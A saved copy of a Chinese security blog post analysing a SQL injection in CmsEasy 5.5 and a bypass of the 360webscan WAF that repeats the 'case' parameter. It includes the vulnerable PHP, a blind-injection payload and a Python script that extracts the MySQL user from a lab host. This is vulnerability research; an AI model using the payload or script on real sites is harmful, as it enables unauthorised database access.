@@ -1,0 +1,368 @@
+
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+<meta content="True" name="HandheldFriendly"/>
+<meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport">
+<meta content="phithon的小站，长期存在与分享关于网络安全与各种编程的原创文章。" name="description"/>
+<meta content="网络安全,代码审计,信息安全,漏洞挖掘,php,C++,mysql,python" name="keywords"/>
+<link href="./cmseasy最新注入+360webscan的绕过分析  离别歌/favicon.ico" rel="shortcut icon"/>
+<link href="./cmseasy最新注入+360webscan的绕过分析  离别歌/favicon-192x192.png" rel="icon" sizes="192x192" type="image/png"/>
+<link href="./cmseasy最新注入+360webscan的绕过分析  离别歌/apple-touch-icon.png" rel="apple-touch-icon" sizes="180x180"/>
+<title>cmseasy最新注入+360webscan的绕过分析 | 离别歌</title>
+<link href="./cmseasy最新注入+360webscan的绕过分析  离别歌/font-awesome.min.css" rel="stylesheet"/>
+<link href="./cmseasy最新注入+360webscan的绕过分析  离别歌/styles.css" rel="stylesheet"/>
+<link href="./cmseasy最新注入+360webscan的绕过分析  离别歌/style.css" rel="stylesheet"/>
+<link href="./cmseasy最新注入+360webscan的绕过分析  离别歌/flexboxgrid.min.css" rel="stylesheet"/>
+<link href="./cmseasy最新注入+360webscan的绕过分析  离别歌/feed" rel="alternate" title="离别歌" type="application/atom+xml">
+<script src="./cmseasy最新注入+360webscan的绕过分析  离别歌/jquery.min.js"></script>
+<link href="./cmseasy最新注入+360webscan的绕过分析  离别歌/code.css" rel="stylesheet"/>
+<link href="./cmseasy最新注入+360webscan的绕过分析  离别歌/button.css" rel="stylesheet"/>
+<link href="./cmseasy最新注入+360webscan的绕过分析  离别歌/pagination.css" rel="stylesheet"/>
+<link href="./cmseasy最新注入+360webscan的绕过分析  离别歌/jquery.fancybox.min.css" rel="stylesheet"/>
+</link></meta></head>
+<body>
+<div id="header-post">
+<a class="active" href="#" id="menu-icon"><i class="fa fa-bars fa-lg"></i></a>
+<a class="active" href="#" id="menu-icon-tablet"><i class="fa fa-bars fa-lg"></i></a>
+<a href="#" id="top-icon-tablet" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+<span id="menu" style="visibility: visible">
+<span id="nav">
+<ul>
+<li><a href="/">主页</a></li>
+<li><a href="javascript:history.back(-1)">返回</a></li>
+</ul>
+</span>
+<br/>
+<span id="actions">
+<ul>
+<li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i aria-hidden="true" class="fa fa-chevron-up" onmouseout="$('#i-top').toggle();" onmouseover="$('#i-top').toggle();"></i></a></li>
+<li><a class="icon" href="#"><i aria-hidden="true" class="fa fa-share-alt" onclick="$('#share').toggle();return false;" onmouseout="$('#i-share').toggle();" onmouseover="$('#i-share').toggle();"></i></a></li>
+</ul>
+<span class="info" id="i-top" style="display:none;">Back to top</span>
+<span class="info" id="i-share" style="display:none;">Share post</span>
+</span>
+<br/>
+<div id="share" style="display: none">
+<ul>
+<li><a class="icon" href="http://www.facebook.com/sharer.php?u=https%3A//www.leavesongs.com/PENETRATION/cmseasy-sql-injection-bypass-360webscan.html"><i aria-hidden="true" class="fa fa-facebook "></i></a></li>
+<li><a class="icon" href="https://twitter.com/share?url=https%3A//www.leavesongs.com/PENETRATION/cmseasy-sql-injection-bypass-360webscan.html&amp;text=cmseasy%E6%9C%80%E6%96%B0%E6%B3%A8%E5%85%A5%2B360webscan%E7%9A%84%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90"><i aria-hidden="true" class="fa fa-twitter "></i></a></li>
+<li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3A//www.leavesongs.com/PENETRATION/cmseasy-sql-injection-bypass-360webscan.html&amp;title=cmseasy%E6%9C%80%E6%96%B0%E6%B3%A8%E5%85%A5%2B360webscan%E7%9A%84%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90"><i aria-hidden="true" class="fa fa-linkedin "></i></a></li>
+<li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3A//www.leavesongs.com/PENETRATION/cmseasy-sql-injection-bypass-360webscan.html&amp;is_video=false&amp;description=cmseasy%E6%9C%80%E6%96%B0%E6%B3%A8%E5%85%A5%2B360webscan%E7%9A%84%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90"><i aria-hidden="true" class="fa fa-pinterest "></i></a></li>
+<li><a class="icon" href="mailto:?subject=cmseasy%E6%9C%80%E6%96%B0%E6%B3%A8%E5%85%A5%2B360webscan%E7%9A%84%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90&amp;body=Check out this article: https%3A//www.leavesongs.com/PENETRATION/cmseasy-sql-injection-bypass-360webscan.html"><i aria-hidden="true" class="fa fa-envelope "></i></a></li>
+<li><a class="icon" href="https://getpocket.com/save?url=https%3A//www.leavesongs.com/PENETRATION/cmseasy-sql-injection-bypass-360webscan.html&amp;title=cmseasy%E6%9C%80%E6%96%B0%E6%B3%A8%E5%85%A5%2B360webscan%E7%9A%84%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90"><i aria-hidden="true" class="fa fa-get-pocket "></i></a></li>
+<li><a class="icon" href="http://reddit.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/cmseasy-sql-injection-bypass-360webscan.html&amp;title=cmseasy%E6%9C%80%E6%96%B0%E6%B3%A8%E5%85%A5%2B360webscan%E7%9A%84%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90"><i aria-hidden="true" class="fa fa-reddit "></i></a></li>
+<li><a class="icon" href="http://www.stumbleupon.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/cmseasy-sql-injection-bypass-360webscan.html&amp;title=cmseasy%E6%9C%80%E6%96%B0%E6%B3%A8%E5%85%A5%2B360webscan%E7%9A%84%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90"><i aria-hidden="true" class="fa fa-stumbleupon "></i></a></li>
+<li><a class="icon" href="http://digg.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/cmseasy-sql-injection-bypass-360webscan.html&amp;title=cmseasy%E6%9C%80%E6%96%B0%E6%B3%A8%E5%85%A5%2B360webscan%E7%9A%84%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90"><i aria-hidden="true" class="fa fa-digg "></i></a></li>
+<li><a class="icon" href="http://www.tumblr.com/share/link?url=https%3A//www.leavesongs.com/PENETRATION/cmseasy-sql-injection-bypass-360webscan.html&amp;name=cmseasy%E6%9C%80%E6%96%B0%E6%B3%A8%E5%85%A5%2B360webscan%E7%9A%84%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90&amp;description="><i aria-hidden="true" class="fa fa-tumblr "></i></a></li>
+</ul>
+</div>
+</span>
+</div>
+<div class="content index width mx-auto px2 my4">
+<article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header>
+<h1 class="posttitle" itemprop="name headline">cmseasy最新注入+360webscan的绕过分析</h1>
+<div class="meta">
+<span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+<span itemprop="name">Phithon</span>
+</span>
+<div class="postdate">
+<time datetime="2015年4月18日 15:17" itemprop="datePublished">
+                    2015 四月 18 15:17
+                </time>
+</div>
+<div class="article-tag">
+            阅读：4026
+            </div>
+<div class="article-tag">
+<i class="fa fa-bookmark"></i>
+<a class="tag-link" href="/sort/PENETRATION">网络安全</a>
+</div>
+<div class="article-tag">
+<i class="fa fa-tag"></i>
+<a class="tag-link" href="/tag/360webscan">360webscan</a>,
+                
+                <a class="tag-link" href="/tag/WAF%E7%BB%95%E8%BF%87">WAF绕过</a>,
+                
+                <a class="tag-link" href="/tag/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E">注入漏洞</a>
+</div>
+</div>
+</header>
+<div class="content" itemprop="articleBody">
+<p>最近一直没什么好文章，只有闲下来挖了几个洞。一般挖洞的时候就没法发文章，因为自己提交上去的洞在公开前是不能泄露的。不过这个洞与乌云某大牛的洞重复了，于是我就发出来一起学习一下。不过这个洞应该有些年头了。</p>
+<p>先下载最新版：<a href="http://ftp.cmseasy.cn/CmsEasy5.x/CmsEasy_5.5_UTF-8_20150318.zip">http://ftp.cmseasy.cn/CmsEasy5.x/CmsEasy_5.5_UTF-8_20150318.zip</a>。经过神器比对，发现最新版进行了一些功能上的修改，可就是这处修改造成注入。</p>
+<p>/lib/default/archive_act.php 283行</p>
+<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="k">if</span> <span class="p">(</span><span class="nx">front</span><span class="o">::</span><span class="na">post</span><span class="p">(</span><span class="s1">'catid'</span><span class="p">))</span> <span class="p">{</span>
+
+           <span class="nv">$cateobj</span> <span class="o">=</span> <span class="nx">category</span><span class="o">::</span><span class="na">getInstance</span><span class="p">();</span>
+           <span class="nv">$sons</span> <span class="o">=</span> <span class="nv">$cateobj</span><span class="o">-&gt;</span><span class="na">sons</span><span class="p">(</span><span class="nx">front</span><span class="o">::</span><span class="na">post</span><span class="p">(</span><span class="s1">'catid'</span><span class="p">));</span>
+           <span class="k">if</span><span class="p">(</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$sons</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$sons</span><span class="p">)){</span>
+               <span class="nv">$cids</span> <span class="o">=</span> <span class="nx">front</span><span class="o">::</span><span class="na">post</span><span class="p">(</span><span class="s1">'catid'</span><span class="p">)</span><span class="o">.</span><span class="s1">','</span><span class="o">.</span><span class="nb">implode</span><span class="p">(</span><span class="s1">','</span><span class="p">,</span><span class="nv">$sons</span><span class="p">);</span>
+           <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+               <span class="nv">$cids</span> <span class="o">=</span> <span class="nx">front</span><span class="o">::</span><span class="na">post</span><span class="p">(</span><span class="s1">'catid'</span><span class="p">);</span>
+           <span class="p">}</span>
+           <span class="nv">$condition</span> <span class="o">.=</span> <span class="s2">"catid in ("</span><span class="o">.</span><span class="nv">$cids</span><span class="o">.</span><span class="s2">") AND "</span><span class="p">;</span>
+           <span class="c1">//var_dump($condition);exit;</span>
+       <span class="p">}</span>
+</pre></div>
+<p><code>$condition .= "catid in (".$cids.") AND ";</code>直接将<code>$cids</code>放入SQL语句，而<code>$cids = front::post('catid');</code>。 由于没有引号包裹，所以造成注入。</p>
+<p>绕过360webscan的方法，还是借助白名单，但方式有点区别。</p>
+<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="sd">/**</span>
+<span class="sd">*  拦截目录白名单</span>
+<span class="sd">*/</span>
+<span class="k">function</span> <span class="nf">webscan_white</span><span class="p">(</span><span class="nv">$webscan_white_name</span><span class="p">,</span><span class="nv">$webscan_white_url</span><span class="o">=</span><span class="k">array</span><span class="p">())</span> <span class="p">{</span>
+ <span class="nv">$url_path</span><span class="o">=</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'SCRIPT_NAME'</span><span class="p">];</span>
+ <span class="nv">$url_var</span><span class="o">=</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'QUERY_STRING'</span><span class="p">];</span>
+ <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/"</span><span class="o">.</span><span class="nv">$webscan_white_name</span><span class="o">.</span><span class="s2">"/is"</span><span class="p">,</span><span class="nv">$url_path</span><span class="p">)</span><span class="o">==</span><span class="mi">1</span><span class="o">&amp;&amp;!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$webscan_white_name</span><span class="p">))</span> <span class="p">{</span>
+   <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
+ <span class="p">}</span>
+ <span class="k">foreach</span> <span class="p">(</span><span class="nv">$webscan_white_url</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
+   <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$url_var</span><span class="p">)</span><span class="o">&amp;&amp;!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$value</span><span class="p">)){</span>
+     <span class="k">if</span> <span class="p">(</span><span class="nb">stristr</span><span class="p">(</span><span class="nv">$url_path</span><span class="p">,</span><span class="nv">$key</span><span class="p">)</span><span class="o">&amp;&amp;</span><span class="nb">stristr</span><span class="p">(</span><span class="nv">$url_var</span><span class="p">,</span><span class="nv">$value</span><span class="p">))</span> <span class="p">{</span>
+       <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
+     <span class="p">}</span>
+   <span class="p">}</span>
+   <span class="k">elseif</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$url_var</span><span class="p">)</span><span class="o">&amp;&amp;</span><span class="k">empty</span><span class="p">(</span><span class="nv">$value</span><span class="p">))</span> <span class="p">{</span>
+     <span class="k">if</span> <span class="p">(</span><span class="nb">stristr</span><span class="p">(</span><span class="nv">$url_path</span><span class="p">,</span><span class="nv">$key</span><span class="p">))</span> <span class="p">{</span>
+       <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
+     <span class="p">}</span>
+   <span class="p">}</span>
+
+ <span class="p">}</span>
+
+ <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+<p><code>if (stristr($url_path,$key)&amp;&amp;stristr($url_var,$value))</code>，当key和value都在白名单中存在时，就不进行过滤。</p>
+<p>而白名单的数组为：</p>
+<p><code>$webscan_white_url = array('index.php' =&gt; 'admin_dir=admin','index.php' =&gt; 'case=file','index.php' =&gt;'case=admin');</code></p>
+<p>也就是说index.php?case=file，这样的请求就不会检测。</p>
+<p>但我们的目标url是index.php?case=archive&amp;act=search&amp;page=1，不是case=file。没关系呀，这里比对的时候用的是<code>$_SERVER['QUERY_STRING'];</code>，而PHP对于两个case=xxx，是取后面一个作为值。所以，请求/index.php?page=1&amp;case=admin&amp;case=archive&amp;act=search即可。</p>
+<p>这样，即可以在QUERY_STRING里找到case=admin，进而绕过360webscan，又可以让case=archive。</p>
+<p>测试：</p>
+<p>向http://10.211.55.3/cmseasy/index.php?page=1&amp;case=admin&amp;case=archive&amp;act=search&amp;keyword=-1 POST数据 catid=-1) or ord(substr(user(),1,1))=114%23</p>
+<p>=114（r）的时候有返回结果： </p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201504/e2361429345203.png"><img alt="QQ20150404-2@2x.png" src="./cmseasy最新注入+360webscan的绕过分析  离别歌/thum-e2361429345203.png"/></a> </p>
+<p>=115的时候没有返回结果：</p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201504/b8161429345207.png"><img alt="QQ20150404-3@2x.png" src="./cmseasy最新注入+360webscan的绕过分析  离别歌/thum-b8161429345207.png"/></a></p>
+<p>脚本验证：</p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201504/b40a1429345198.png"><img alt="QQ20150404-1@2x.png" src="./cmseasy最新注入+360webscan的绕过分析  离别歌/thum-b40a1429345198.png"/></a></p>
+<p>脚本如下：</p>
+<div class="codehilite"><pre><span></span><span class="ch">#!/usr/bin/python</span>
+<span class="kn">import</span> <span class="nn">requests</span><span class="o">,</span> <span class="nn">sys</span><span class="o">,</span> <span class="nn">base64</span><span class="o">,</span> <span class="nn">traceback</span>
+<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+       <span class="s1">'User-Agent'</span><span class="p">:</span> <span class="s1">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36'</span>
+<span class="p">}</span>
+<span class="n">payloads</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="s1">'@abcdefghijklmnopqrstuvwxyz.0123456789'</span><span class="p">)</span>
+<span class="k">print</span> <span class="s1">'start to retrive MySQL infomation:'</span>
+<span class="k">def</span> <span class="nf">run</span><span class="p">():</span>
+       <span class="n">user</span> <span class="o">=</span> <span class="s1">''</span>
+       <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">16</span><span class="p">):</span>
+               <span class="k">for</span> <span class="n">payload</span> <span class="ow">in</span> <span class="n">payloads</span><span class="p">:</span>
+                       <span class="k">try</span><span class="p">:</span>
+                               <span class="n">data</span> <span class="o">=</span>  <span class="p">{</span>
+                                       <span class="s2">"catid"</span><span class="p">:</span> <span class="s1">'-1) or ord(substr(user(),</span><span class="si">%s</span><span class="s1">,1))=</span><span class="si">%s</span><span class="s1">#'</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="nb">ord</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
+                               <span class="p">}</span>
+                               <span class="n">req</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s2">"http://10.211.55.3/cmseasy/index.php?page=1&amp;case=admin&amp;case=archive&amp;act=search&amp;keyword=-1"</span><span class="p">,</span> <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">,</span> <span class="n">headers</span> <span class="o">=</span> <span class="n">headers</span><span class="p">,</span> <span class="n">timeout</span> <span class="o">=</span> <span class="mi">5</span><span class="p">)</span>
+                               <span class="k">if</span> <span class="s2">"&lt;strong&gt;1&lt;/strong&gt;"</span> <span class="ow">in</span> <span class="n">req</span><span class="o">.</span><span class="n">content</span><span class="p">:</span>
+                                       <span class="n">user</span> <span class="o">+=</span> <span class="n">payload</span>
+                                       <span class="k">print</span> <span class="s1">'</span><span class="se">\n</span><span class="s1">[In progress]'</span><span class="p">,</span> <span class="n">user</span>
+                                       <span class="k">break</span>
+                       <span class="k">except</span><span class="p">:</span>
+                               <span class="k">print</span> <span class="n">traceback</span><span class="o">.</span><span class="n">print_exc</span><span class="p">()</span>
+                               <span class="k">break</span>
+                       <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">'.'</span><span class="p">)</span>
+                       <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">flush</span><span class="p">()</span>
+       <span class="k">print</span> <span class="s1">'</span><span class="se">\n</span><span class="s1">[Done]infomation is'</span><span class="p">,</span> <span class="n">user</span>
+
+<span class="n">run</span><span class="p">()</span>
+</pre></div>
+</div>
+</article>
+<div id="reply-list">
+<h1>评论</h1>
+<div class="row" id="comment-2099">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./cmseasy最新注入+360webscan的绕过分析  离别歌/d41d8cd98f00b204e9800998ecf8427e.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">HELEN</a>
+<time datetime="2015年6月2日 14:13" itemprop="datePublished">
+                            2015 六月 02 14:13
+                        </time>
+<a href="javascript:reply_to('2099', 'HELEN')">回复</a>
+</p>
+<p class="comment-meta">还没来得及玩就修复了。。</p>
+</div>
+</div>
+<div class="row" id="comment-2035">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./cmseasy最新注入+360webscan的绕过分析  离别歌/7dd5fa98c8c8fc6032731b1f5df06d44.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">nf0v</a>
+<time datetime="2015年4月22日 08:40" itemprop="datePublished">
+                            2015 四月 22 08:40
+                        </time>
+<a href="javascript:reply_to('2035', 'nf0v')">回复</a>
+</p>
+<p class="comment-meta">神器是什么？文中提到的神器，求大牛回答！！</p>
+</div>
+</div>
+<div class="child-node">
+<div class="row" id="comment-2037">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./cmseasy最新注入+360webscan的绕过分析  离别歌/c4267eb6d17276fa31c547ac71611e90.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://www.leavesongs.com/" target="_blank">phithon</a>
+<time datetime="2015年4月22日 11:54" itemprop="datePublished">
+                            2015 四月 22 11:54
+                        </time>
+<a href="javascript:reply_to('2037', 'phithon')">回复</a>
+</p>
+<p class="comment-meta">@nf0v：佛曰不能说</p>
+</div>
+</div>
+<div class="child-node">
+<div class="row" id="comment-2039">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./cmseasy最新注入+360webscan的绕过分析  离别歌/7dd5fa98c8c8fc6032731b1f5df06d44.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">nf0v</a>
+<time datetime="2015年4月22日 12:31" itemprop="datePublished">
+                            2015 四月 22 12:31
+                        </time>
+<a href="javascript:reply_to('2039', 'nf0v')">回复</a>
+</p>
+<p class="comment-meta">@phithon：beyond compare 对把，谢谢大牛！</p>
+</div>
+</div>
+</div>
+</div>
+<div class="row" id="comment-2034">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./cmseasy最新注入+360webscan的绕过分析  离别歌/7dd5fa98c8c8fc6032731b1f5df06d44.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">nf0v</a>
+<time datetime="2015年4月21日 17:37" itemprop="datePublished">
+                            2015 四月 21 17:37
+                        </time>
+<a href="javascript:reply_to('2034', 'nf0v')">回复</a>
+</p>
+<p class="comment-meta">神奇是什么？</p>
+</div>
+</div>
+<div class="row" id="comment-2032">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./cmseasy最新注入+360webscan的绕过分析  离别歌/510f3eac7116915ec7495c370163f63d.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://abc000.cn/" target="_blank">神州网络</a>
+<time datetime="2015年4月20日 16:38" itemprop="datePublished">
+                            2015 四月 20 16:38
+                        </time>
+<a href="javascript:reply_to('2032', '神州网络')">回复</a>
+</p>
+<p class="comment-meta">支持</p>
+</div>
+</div>
+<div class="row" id="comment-2030">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./cmseasy最新注入+360webscan的绕过分析  离别歌/bacb85dc885e2fb67422b43e8857112f.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://th1nk.info" target="_blank">Th1nk</a>
+<time datetime="2015年4月18日 19:53" itemprop="datePublished">
+                            2015 四月 18 19:53
+                        </time>
+<a href="javascript:reply_to('2030', 'Th1nk')">回复</a>
+</p>
+<p class="comment-meta">自从时雨牛有了mac之后，更加炫酷了</p>
+</div>
+</div>
+</div>
+<form action="#reply" enctype="multipart/form-data" id="reply" method="post">
+<textarea cols="40" id="id_content" name="content" required="" rows="6">
+</textarea>
+<div class="row">
+<div class="col-xs-4">
+<input id="id_nickname" maxlength="64" name="nickname" placeholder="昵称" required="" type="text"/>
+</div>
+<div class="col-xs-4">
+<input id="id_email" maxlength="254" name="email" placeholder="邮箱（可留空）" type="text"/>
+</div>
+<div class="col-xs-4">
+<input id="id_url" maxlength="200" name="url" placeholder="链接（可留空）" type="text"/>
+</div>
+</div>
+<div class="row" style="margin-top: 8px"><div class="col-xs-4"><input autocomplete="off" id="id_captcha_1" name="captcha_1" placeholder="验证码" type="text"/> <input id="id_captcha_0" name="captcha_0" type="hidden" value="3133c8753b0a93a9bfd29c4cee642143472f5b17"/>
+</div><div class="col-xs-4">
+<img alt="captcha" class="captcha" height="25" src="./cmseasy最新注入+360webscan的绕过分析  离别歌/3133c8753b0a93a9bfd29c4cee642143472f5b17"/></div></div>
+<div class="clearfix"></div>
+<input class="ui-button ui-button-sgreen" type="submit" value="提交"/>
+<input id="id_archive" name="archive" type="hidden" value="353">
+<input id="id_parent" name="parent" type="hidden"/>
+<input name="csrfmiddlewaretoken" type="hidden" value="43N9UWVEfuV9W4QAKhegm71JAwyXkhCoCn8FIq7TGhPyWJePyyI0VL3OJA153Lry"/>
+</input></form>
+</div>
+<footer id="footer">
+<div class="footer-left">
+    Copyright © 2017 Powered by talkbook
+  </div>
+<div class="footer-right">
+<nav>
+<ul>
+<li><a href="/">首页</a></li>
+<li><a href="http://weibo.com/101yx" target="_blank">微博</a></li>
+<li><a href="https://github.com/phith0n" target="_blank">项目</a></li>
+<li><a href="/template/change/">更换模板</a></li>
+</ul>
+</nav>
+</div>
+</footer>
+<script src="./cmseasy最新注入+360webscan的绕过分析  离别歌/main.js"></script>
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?ad9ab5e37c2811b9f0979e46123fc898";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+<script src="./cmseasy最新注入+360webscan的绕过分析  离别歌/jquery.fancybox.pack.js"></script>
+<script>
+$(document).ready(function () {
+    $("article a").each(function (i, e) {
+        if(e.host != 'www.leavesongs.com') {
+            e.target = '_blank';
+        }
+    });
+    $("article img").each(function (i, e) {
+        if(e.parentNode.tagName.toUpperCase() != 'A') {
+            $(e).wrap('<a href="'+escapeHtml(e.src)+'" class="fancybox"></a>');
+        } else {
+            $(e.parentNode).addClass('fancybox');
+        }
+    });
+    $('.fancybox').fancybox();
+})
+</script>
+</body>
+</html>
